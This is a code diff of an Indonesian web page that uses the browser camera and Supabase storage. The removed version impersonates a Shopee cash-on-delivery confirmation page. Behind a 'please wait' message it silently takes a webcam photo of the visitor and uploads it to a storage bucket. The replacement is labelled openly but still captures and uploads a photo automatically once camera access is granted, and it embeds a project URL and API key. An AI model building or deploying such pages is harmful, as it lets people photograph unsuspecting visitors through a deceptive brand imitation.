@@ -1,83 +1,77 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Shopee COD</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Simpan Foto ke Supabase</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align:center; background:#f5f5f5; margin:0; }
-    header { background:#ff5722; color:#fff; padding:15px; font-size:20px; font-weight:bold; }
-    video { width:90%; max-width:500px; border:2px solid #ff5722; border-radius:8px; margin-top:10px; }
-    .hasil { margin:20px auto; padding:15px; border:2px solid #ff5722; border-radius:8px; max-width:500px; background:#fff; }
-    .prank { color:#ff5722; font-weight:bold; }
+    body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
+    video, canvas { width: 300px; border: 2px solid #333; margin: 10px 0; }
+    #status { margin-top: 10px; color: green; font-weight: bold; }
   </style>
 </head>
 <body>
-  <header>Shopee COD - Konfirmasi Pesanan</header>
-  <p>Sedang memproses... Harap tunggu sebentar.</p>
-
+  <h2>Ambil Foto & Simpan ke Supabase</h2>
+  
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
+  <div id="status"></div>
 
-  <div class="hasil">
-    <h2>Pesanan COD kamu sudah dikonfirmasi!</h2>
-    <p class="prank">😂 Ketahuan suka COD lagi ya!</p>
-  </div>
-
-  <!-- Supabase Client -->
+  <!-- Supabase JS -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
-    // Ganti dengan data dari Supabase kamu
-    const SUPABASE_URL = "https://xxxx.supabase.co";   // <-- Project URL
-    const SUPABASE_KEY = "eyJhbGciOi...";              // <-- anon public key
-    const BUCKET = "foto-users";                      // <-- nama bucket
+    const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpbnFkbHNkZGxkbGpscXZzeG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Mzg4MDcsImV4cCI6MjA3MjIxNDgwN30.PdO2Fl37xYkG0T9skBJ9R7VTi553-iSUZGBm1L4yTkE";
+    const BUCKET = "foto-users"; // ganti dengan nama bucket kamu
 
     const { createClient } = supabase;
-    const supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
+    const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const statusEl = document.getElementById("status");
 
-    async function startCameraAndUpload() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    // Aktifkan kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
         video.srcObject = stream;
 
+        // Ketika video sudah siap, langsung ambil foto
         video.onloadedmetadata = () => {
-          video.play();
-
-          setTimeout(async () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convert canvas ke Blob
-            canvas.toBlob(async (blob) => {
-              let filename = `foto_${Date.now()}.png`;
-
-              // Upload ke Supabase Storage
-              const { data, error } = await supabaseClient.storage
-                .from(BUCKET)
-                .upload(filename, blob, { contentType: "image/png" });
-
-              if (error) {
-                console.error("Upload error:", error);
-              } else {
-                console.log("Foto tersimpan di Supabase:", data);
-              }
-            }, "image/png");
-
-            // Stop kamera
-            stream.getTracks().forEach(track => track.stop());
-          }, 3000);
+          ambilFotoOtomatis();
         };
-      } catch (err) {
-        alert("Tidak bisa akses kamera: " + err.message);
-      }
-    }
+      })
+      .catch(err => {
+        alert("Tidak bisa mengakses kamera: " + err);
+      });
 
-    startCameraAndUpload();
+    async function ambilFotoOtomatis() {
+      const ctx = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+        const fileName = `foto_${Date.now()}.png`;
+
+        // Upload ke Supabase Storage
+        const { error } = await client.storage
+          .from(BUCKET)
+          .upload(fileName, blob, {
+            cacheControl: "3600",
+            upsert: false,
+            contentType: "image/png"
+          });
+
+        if (error) {
+          statusEl.style.color = "red";
+          statusEl.innerText = "Gagal upload: " + error.message;
+        } else {
+          statusEl.style.color = "green";
+          statusEl.innerText = "Foto berhasil disimpan!";
+        }
+      }, "image/png");
+    }
   </script>
 </body>
 </html>
